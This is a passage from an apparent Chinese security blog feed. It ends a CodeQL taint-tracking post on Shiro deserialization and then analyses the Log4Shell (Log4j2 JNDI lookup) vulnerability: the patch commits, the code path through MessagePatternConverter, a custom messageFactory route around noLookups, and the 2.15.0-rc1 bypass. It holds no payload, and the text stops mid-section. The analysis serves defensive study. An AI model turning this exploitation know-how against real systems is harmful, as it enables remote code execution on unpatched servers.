keyword">this</span><span class="token punctuation">.</span><span class="token function">hasName</span><span class="token punctuation">(</span><span class="token string">"readObject"</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">MyTaintTest</span> <span class="token keyword">extends</span> <span class="token class-name">TaintTracking2</span><span class="token operator">:</span><span class="token operator">:</span>Configuration <span class="token punctuation">{</span>    <span class="token function">MyTaintTest</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token keyword">this</span> <span class="token operator">=</span> <span class="token string">"MyTaintTest"</span><span class="token punctuation">}</span>    override predicate <span class="token function">isSource</span> <span class="token punctuation">(</span>DataFlow<span class="token operator">:</span><span class="token operator">:</span>Node node<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">exists</span><span class="token punctuation">(</span>FieldAccess fda <span class="token operator">|</span> fda <span class="token operator">=</span> node<span class="token punctuation">.</span><span class="token function">asExpr</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>    override predicate <span class="token function">isSink</span><span class="token punctuation">(</span>DataFlow<span class="token operator">:</span><span class="token operator">:</span>Node node<span class="token punctuation">)</span> <span class="token punctuation">{</span>         <span class="token function">exists</span><span class="token punctuation">(</span>MethodAccess mda <span class="token operator">|</span>             mda <span class="token operator">=</span> node<span class="token punctuation">.</span><span class="token function">asExpr</span><span class="token punctuation">(</span><span class="token punctuation">)</span> and             mda<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">instanceof</span> <span class="token class-name">DeseializationMethod</span>        <span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span>from MyTaintTest conf<span class="token punctuation">,</span> DataFlow2<span class="token operator">:</span><span class="token operator">:</span>PathNode source<span class="token punctuation">,</span> DataFlow2<span class="token operator">:</span><span class="token operator">:</span>PathNode sinkwhere conf<span class="token punctuation">.</span><span class="token function">hasFlowPath</span><span class="token punctuation">(</span>source<span class="token punctuation">,</span> sink<span class="token punctuation">)</span>select sink<span class="token punctuation">.</span><span class="token function">getNode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> source<span class="token punctuation">,</span> sink<span class="token punctuation">,</span> <span class="token string">"from $@"</span><span class="token punctuation">,</span> source<span class="token punctuation">.</span><span class="token function">getNode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"this user input"</span></code></pre><p>得出的结果实际卡在 AbstractRememberMeManager，说明向上的 source 断了</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/91764dea/16402412852020.jpg" alt></p><h3 id="优化-Source"><a href="#优化-Source" class="headerlink" title="优化 Source"></a>优化 Source</h3><p>按大佬给的 RemoteFlowSource（至于它本身代表什么稍后再说）作为 source，上面的代码基本不动，只是修改 isSource 判断逻辑</p><pre class=" language-java"><code class="language-java">override predicate <span class="token function">isSource</span> <span class="token punctuation">(</span>DataFlow<span class="token operator">:</span><span class="token operator">:</span>Node node<span class="token punctuation">)</span> <span class="token punctuation">{</span>    node <span class="token keyword">instanceof</span> <span class="token class-name">RemoteFlowSource</span><span class="token punctuation">}</span></code></pre><p>可以看到 Path 直接跟到了 SimpleCookie，基本上达到了入口点的位置，中间的变量传递也帮我们识别解决了</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/91764dea/16402422156249.jpg" alt></p><h4 id="RemoteFlowSource"><a href="#RemoteFlowSource" class="headerlink" title="RemoteFlowSource"></a>RemoteFlowSource</h4><p>代码位于<code>/java/ql/lib/semmle/code/java/dataflow/FlowSources.qll</code>，主要识别各种可用于污染跟踪的流源</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/91764dea/16402488817802.jpg" alt></p><p>因为有很多子类，不好确定到底是哪个类型触发的，将输出改为<code>source.getNode().getAQlClass()</code>我们能获取到以下内容，可以知道关键在于<code>ExternalRemoteFlowSource</code></p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/91764dea/16402468069276.jpg" alt></p><h4 id="ExternalRemoteFlowSource"><a href="#ExternalRemoteFlowSource" class="headerlink" title="ExternalRemoteFlowSource"></a>ExternalRemoteFlowSource</h4><p>定义很简单，主要是 sourceNode 方法</p><pre class=" language-java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">class</span> <span class="token class-name">ExternalRemoteFlowSource</span> <span class="token keyword">extends</span> <span class="token class-name">RemoteFlowSource</span> <span class="token punctuation">{</span>  <span class="token function">ExternalRemoteFlowSource</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token function">sourceNode</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> <span class="token string">"remote"</span><span class="token punctuation">)</span> <span class="token punctuation">}</span>  override string <span class="token function">getSourceType</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> result <span class="token operator">=</span> <span class="token string">"external"</span> <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>方法定义于<code>/java/ql/lib/semmle/code/java/dataflow/ExternalFlow.qll#L723</code></p><pre class=" language-java"><code class="language-java">predicate <span class="token function">sourceNode</span><span class="token punctuation">(</span>Node node<span class="token punctuation">,</span> string kind<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">exists</span><span class="token punctuation">(</span>InterpretNode n <span class="token operator">|</span> <span class="token function">isSourceNode</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span> kind<span class="token punctuation">)</span> and n<span class="token punctuation">.</span><span class="token function">asNode</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> node<span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre><p>这里就不再往下深入跟方法了，我们来看看它所在的 ExternalFlow 的内容，这里的注释很关键也方便理解，由于篇幅的缘故不放上来，自行查阅，我们关注以下内容</p><pre class=" language-plain"><code class="language-plain">The CSV specification has the following columns: - Sources:   `namespace; type; subtypes; name; signature; ext; output; kind` - Sinks:   `namespace; type; subtypes; name; signature; ext; input; kind` - Summaries:   `namespace; type; subtypes; name; signature; ext; input; output; kind`The `kind` column is a tag that can be referenced from QL to determine to which classes the interpreted elements should be added. For example, for sources "remote" indicates a default remote flow source, and for summaries "taint" indicates a default additional taint step and "value" indicates a globally applicable value-preserving step.</code></pre><p>根据上面理解 kind 的作用，大致意思就是对 source 进行解析，并通过 kind 来标记三种类型</p><ul><li>remote : 远程流的 source</li><li>taint : 附加污点进行跟踪</li><li>value : 全局保留值</li></ul><pre class=" language-java"><code class="language-java"><span class="token keyword">private</span> predicate <span class="token function">sourceModelCsv</span><span class="token punctuation">(</span>string row<span class="token punctuation">)</span> <span class="token punctuation">{</span>  row <span class="token operator">=</span>    <span class="token punctuation">[</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token comment" spellcheck="true">// CookieGet*</span>      <span class="token string">"javax.servlet.http;Cookie;false;getValue;();;ReturnValue;remote"</span><span class="token punctuation">,</span>      <span class="token string">"javax.servlet.http;Cookie;false;getName;();;ReturnValue;remote"</span><span class="token punctuation">,</span>      <span class="token string">"javax.servlet.http;Cookie;false;getComment;();;ReturnValue;remote"</span><span class="token punctuation">,</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token punctuation">]</span><span class="token keyword">private</span> predicate <span class="token function">summaryModelCsv</span><span class="token punctuation">(</span>string row<span class="token punctuation">)</span> <span class="token punctuation">{</span>  row <span class="token operator">=</span>    <span class="token punctuation">[</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token comment" spellcheck="true">// arg to return</span>      <span class="token string">"java.nio;ByteBuffer;false;wrap;(byte[]);;Argument[0];ReturnValue;taint"</span><span class="token punctuation">,</span>      <span class="token string">"java.util;Base64$Encoder;false;encode;(byte[]);;Argument[0];ReturnValue;taint"</span><span class="token punctuation">,</span>      <span class="token string">"java.util;Base64$Encoder;false;encode;(ByteBuffer);;Argument[0];ReturnValue;taint"</span><span class="token punctuation">,</span>      <span class="token string">"java.util;Base64$Encoder;false;encodeToString;(byte[]);;Argument[0];ReturnValue;taint"</span><span class="token punctuation">,</span>      <span class="token string">"java.util;Base64$Encoder;false;wrap;(OutputStream);;Argument[0];ReturnValue;taint"</span><span class="token punctuation">,</span>      <span class="token string">"java.util;Base64$Decoder;false;decode;(byte[]);;Argument[0];ReturnValue;taint"</span><span class="token punctuation">,</span>      <span class="token string">"java.util;Base64$Decoder;false;decode;(ByteBuffer);;Argument[0];ReturnValue;taint"</span><span class="token punctuation">,</span>      <span class="token string">"java.util;Base64$Decoder;false;decode;(String);;Argument[0];ReturnValue;taint"</span><span class="token punctuation">,</span>      <span class="token string">"java.util;Base64$Decoder;false;wrap;(InputStream);;Argument[0];ReturnValue;taint"</span><span class="token punctuation">,</span>      <span class="token string">"cn.hutool.core.codec;Base64;true;decode;;;Argument[0];ReturnValue;taint"</span><span class="token punctuation">,</span>      <span class="token string">"org.apache.shiro.codec;Base64;false;decode;(String);;Argument[0];ReturnValue;taint"</span><span class="token punctuation">,</span>      <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token punctuation">]</span></code></pre><p>由此，关键的点 CodeQL 官方已经帮我们识别主流框架中的数据源，并通过将一些变量传递点设为污染连接起来，省去了很多麻烦，不过同时由于限定于这些内容，对于完全自行开发的代码内容就没有那么有效了（如果有这种项目也是神奇）</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ol><li><a href="https://www.anquanke.com/post/id/256967" target="_blank" rel="noopener">从Java反序列化漏洞题看CodeQL数据流</a></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;全世界都在学CodeQL？&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="CodeQL" scheme="https://blog.sari3l.com/tags/CodeQL/"/>
    
  </entry>
  
  <entry>
    <title>Log4shell 小记</title>
    <link href="https://blog.sari3l.com/posts/9e42d867/"/>
    <id>https://blog.sari3l.com/posts/9e42d867/</id>
    <published>2021-12-13T17:32:35.000Z</published>
    <updated>2021-12-16T09:50:05.977Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，文章作者不为此承担任何责任。</p></blockquote><h2 id="version-lt-2-15-0-rc1"><a href="#version-lt-2-15-0-rc1" class="headerlink" title="version &lt; 2.15.0-rc1"></a>version &lt; 2.15.0-rc1</h2><h3 id="commit-分析"><a href="#commit-分析" class="headerlink" title="commit 分析"></a>commit 分析</h3><p>首先根据这两个commits 基本可以确定最终是通过lookup执行了JNDI攻击</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/9e42d867/272ead80ffed4144b536829a1312aac9.png" alt="272ead80ffed4144b536829a1312aac9"></p><p>LOG4J2-3198中可以发现一丝端倪</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/9e42d867/9f77e65bf41448d9b8394bd5ba3c8775.png" alt="9f77e65bf41448d9b8394bd5ba3c8775"></p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/9e42d867/0a0bb15def3c40a38a9ff873ade0ae24.png" alt="0a0bb15def3c40a38a9ff873ade0ae24"></p><p>通过这两段diff，基本确认就是在MessagePatternConverter通过触发lookup形成了漏洞</p><p>另外可见官方<code>Lookups</code><a href="https://logging.apache.org/log4j/log4j-2.3/manual/lookups.html#JndiLookup" target="_blank" rel="noopener">文档</a>，这里大概知道怎么构造触发</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/9e42d867/fc3a53e4edf6417db5f0833067a6dba8.png" alt="fc3a53e4edf6417db5f0833067a6dba8"></p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>首先经过<code>org.apache.logging.log4j.spi.AbstractLogger#logIfEnabled</code>，在这里isEnabled的作用是比较配置文件中Root设定的最低记录信息等级，确认是否需要记录，等级对应在<code>org.apache.logging.log4j.spi.StandardLevel</code>，数字越大记录越全</p><pre class=" language-java"><code class="language-java"><span class="token annotation punctuation">@Override</span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">logIfEnabled</span><span class="token punctuation">(</span><span class="token keyword">final</span> String fqcn<span class="token punctuation">,</span> <span class="token keyword">final</span> Level level<span class="token punctuation">,</span> <span class="token keyword">final</span> Marker marker<span class="token punctuation">,</span> <span class="token keyword">final</span> String message<span class="token punctuation">,</span>        <span class="token keyword">final</span> Throwable t<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isEnabled</span><span class="token punctuation">(</span>level<span class="token punctuation">,</span> marker<span class="token punctuation">,</span> message<span class="token punctuation">,</span> t<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">logMessage</span><span class="token punctuation">(</span>fqcn<span class="token punctuation">,</span> level<span class="token punctuation">,</span> marker<span class="token punctuation">,</span> message<span class="token punctuation">,</span> t<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>之后通过默认工厂类构造msg，(这里可能会有隐患，详见：<strong>关于自定义 log4j2.messageFactory</strong> 一节</p><pre class=" language-java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">static</span> MessageFactory2 <span class="token function">createDefaultMessageFactory</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">try</span> <span class="token punctuation">{</span>        <span class="token keyword">final</span> MessageFactory result <span class="token operator">=</span> DEFAULT_MESSAGE_FACTORY_CLASS<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token function">narrow</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">final</span> InstantiationException <span class="token operator">|</span> IllegalAccessException e<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>执行到<code>org.apache.logging.log4j.core.layout.PatternLayout.PatternSerializer#toSerializable</code>，这里会根据配置解析出的转换器进行数据的格式化并将内容填充到buffer</p><pre class=" language-java"><code class="language-java"><span class="token annotation punctuation">@Override</span><span class="token keyword">public</span> StringBuilder <span class="token function">toSerializable</span><span class="token punctuation">(</span><span class="token keyword">final</span> LogEvent event<span class="token punctuation">,</span> <span class="token keyword">final</span> StringBuilder buffer<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">final</span> <span class="token keyword">int</span> len <span class="token operator">=</span> formatters<span class="token punctuation">.</span>length<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> len<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        formatters<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span>event<span class="token punctuation">,</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>replace <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">// creates temporary objects</span>        String str <span class="token operator">=</span> buffer<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        str <span class="token operator">=</span> replace<span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span>        buffer<span class="token punctuation">.</span><span class="token function">setLength</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        buffer<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> buffer<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>当formatter为<code>org.apache.logging.log4j.core.pattern.MessagePatternConverter#format</code>时，如果<code>noLookups</code>未开启，则会尝试通过<code>replace</code>根据表达式替换信息</p><pre class=" language-java"><code class="language-java"><span class="token annotation punctuation">@Override</span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">format</span><span class="token punctuation">(</span><span class="token keyword">final</span> LogEvent event<span class="token punctuation">,</span> <span class="token keyword">final</span> StringBuilder toAppendTo<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">final</span> Message msg <span class="token operator">=</span> event<span class="token punctuation">.</span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>msg <span class="token keyword">instanceof</span> <span class="token class-name">StringBuilderFormattable</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">final</span> <span class="token keyword">boolean</span> doRender <span class="token operator">=</span> textRenderer <span class="token operator">!=</span> null<span class="token punctuation">;</span>        <span class="token keyword">final</span> StringBuilder workingBuilder <span class="token operator">=</span> doRender <span class="token operator">?</span> <span class="token keyword">new</span> <span class="token class-name">StringBuilder</span><span class="token punctuation">(</span><span class="token number">80</span><span class="token punctuation">)</span> <span class="token operator">:</span> toAppendTo<span class="token punctuation">;</span>        <span class="token keyword">final</span> <span class="token keyword">int</span> offset <span class="token operator">=</span> workingBuilder<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>msg <span class="token keyword">instanceof</span> <span class="token class-name">MultiFormatStringBuilderFormattable</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">// TODO can we optimize this?</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>config <span class="token operator">!=</span> null <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>noLookups<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> offset<span class="token punctuation">;</span> i <span class="token operator">&lt;</span> workingBuilder<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>workingBuilder<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">'$'</span> <span class="token operator">&amp;&amp;</span> workingBuilder<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">'{'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token keyword">final</span> String value <span class="token operator">=</span> workingBuilder<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span>offset<span class="token punctuation">,</span> workingBuilder<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    workingBuilder<span class="token punctuation">.</span><span class="token function">setLength</span><span class="token punctuation">(</span>offset<span class="token punctuation">)</span><span class="token punctuation">;</span>                    workingBuilder<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>config<span class="token punctuation">.</span><span class="token function">getStrSubstitutor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span>event<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>doRender<span class="token punctuation">)</span> <span class="token punctuation">{</span>            textRenderer<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span>workingBuilder<span class="token punctuation">,</span> toAppendTo<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>msg <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>最后实际由<code>org.apache.logging.log4j.core.lookup.StrSubstitutor#substitute</code>进行替换操作<br>由<code>org.apache.logging.log4j.core.lookup.StrSubstitutor#resolveVariable</code>执行lookup表达式</p><p>并通过前缀判断进入到对应协议解析<br><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/9e42d867/7c2e017a39584e83a011826291233312.png" alt="7c2e017a39584e83a011826291233312"></p><p>后面就是常规JNDI利用，不再赘述（这里还未限制协议头</p><h3 id="自定义-log4j2-messageFactory"><a href="#自定义-log4j2-messageFactory" class="headerlink" title="自定义 log4j2.messageFactory"></a>自定义 log4j2.messageFactory</h3><p>首先msg通过<code>messageFactory.newMessage(message)</code>产生，如果全以默认且仅传入message则默认进入<code>org.apache.logging.log4j.message.ReusableMessageFactory#newMessage(java.lang.CharSequence)</code></p><pre class=" language-java"><code class="language-java"><span class="token annotation punctuation">@Override</span><span class="token keyword">public</span> Message <span class="token function">newMessage</span><span class="token punctuation">(</span><span class="token keyword">final</span> String message<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">final</span> ReusableSimpleMessage result <span class="token operator">=</span> <span class="token function">getSimple</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    result<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>message<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>如果设定messageFactory为log4j2自有的factory</p><ul><li>FormattedMessageFactory</li><li>LocalizedMessageFactory</li><li>MessageFormatMessageFactory</li><li>ParameterizedMessageFactory</li><li>ParameterizedNoReferenceMessageFactory</li><li>SimpleMessageFactory</li><li>StringFormatterMessageFactory</li></ul><p>则会进入<br><code>org.apache.logging.log4j.message.AbstractMessageFactory#newMessage(java.lang.String)</code></p><pre class=" language-java"><code class="language-java"><span class="token annotation punctuation">@Override</span><span class="token keyword">public</span> Message <span class="token function">newMessage</span><span class="token punctuation">(</span><span class="token keyword">final</span> String message<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">SimpleMessage</span><span class="token punctuation">(</span>message<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>在记录event时，会通过<code>org.apache.logging.log4j.core.impl.MutableLogEvent#setMessage</code>尝试提取msg信息，这里比较关键</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setMessage</span><span class="token punctuation">(</span><span class="token keyword">final</span> Message msg<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>msg <span class="token keyword">instanceof</span> <span class="token class-name">ReusableMessage</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">final</span> ReusableMessage reusable <span class="token operator">=</span> <span class="token punctuation">(</span>ReusableMessage<span class="token punctuation">)</span> msg<span class="token punctuation">;</span>        reusable<span class="token punctuation">.</span><span class="token function">formatTo</span><span class="token punctuation">(</span><span class="token function">getMessageTextForWriting</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>messageFormat <span class="token operator">=</span> msg<span class="token punctuation">.</span><span class="token function">getFormat</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>parameters <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>            parameters <span class="token operator">=</span> reusable<span class="token punctuation">.</span><span class="token function">swapParameters</span><span class="token punctuation">(</span>parameters<span class="token punctuation">)</span><span class="token punctuation">;</span>            parameterCount <span class="token operator">=</span> reusable<span class="token punctuation">.</span><span class="token function">getParameterCount</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>message <span class="token operator">=</span> InternalAsyncUtil<span class="token punctuation">.</span><span class="token function">makeMessageImmutable</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> Message <span class="token function">makeMessageImmutable</span><span class="token punctuation">(</span><span class="token keyword">final</span> Message msg<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// if the Message instance is reused, there is no point in freezing its message here</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>msg <span class="token operator">!=</span> null <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">canFormatMessageInBackground</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            msg<span class="token punctuation">.</span><span class="token function">getFormattedMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// LOG4J2-763: ask message to makeMessageImmutable parameters</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> msg<span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><p>以及后面开始执行格式化<code>org.apache.logging.log4j.core.pattern.MessagePatternConverter#format</code>时注意第二部分，会直接无视lookup是否开启，尝试执行替换</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/9e42d867/03ee5f0b5af94c3e8e5e8a27471fcd56.png" alt="03ee5f0b5af94c3e8e5e8a27471fcd56"></p><p>所以关键点在控制以下两点的返回</p><ol><li>messageFactory.newMessage(message) - 返回非继承 ReusableMessage、StringBuilderFormattable、MultiformatMessage</li><li>msg.getFormattedMessage() - 返回恶意 payload 字符串</li></ol><p>所以如何控制呢，其实很简单</p><ol><li>getLogger时指定工厂类，不是ReusableMessage、MultiformatMessage对应Factory（而开发喜欢自定义的工厂类更具危险</li><li>看情况使用单参、多参构造，控制messageFactory.newMessage(…) 返回</li></ol><p><del>很容易构造相关场景，这里暂不提供</del></p><h2 id="version-2-15-0-rc1"><a href="#version-2-15-0-rc1" class="headerlink" title="version == 2.15.0-rc1"></a>version == 2.15.0-rc1</h2><p>这个版本出现了bypass，也是提供了现实案例：官方的补丁不一定安全</p><h3 id="commit-分析-1"><a href="#commit-分析-1" class="headerlink" title="commit 分析"></a>commit 分析</h3><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/9e42d867/ea42bbc5f05a4cf796789b7e2e8a83af.png" alt="ea42bbc5f05a4cf796789b7e2e8a83af"></p><p>很明显，通过异常报错绕过了一些限制，导致直接不安全的lookup（为什么需要这么绕过呢，因为JndiManager初始化时通过设置allowedProtocols与allowedHosts还有allowedClasses基本限制了ldap(s)的利用</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/9e42d867/b6fa61e593f945e89278b35ed553e256.png" alt="b6fa61e593f945e89278b35ed553e256"></p><p>另外注意到LOG4J2-3198在MessagePatternConverter创建实例时新增了判断，默认是SimpleMessagePatternConverter，如果格式化字符带有{lookup}选项时，则通过FormattedMessagePatternConverter创建</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/9e42d867/e712a600e6704c79ace4033855eaef8a.png" alt="e712a600e6704c79ace4033855eaef8a"></p><h3 id="分析-1"><a href="#分析-1" class="headerlink" 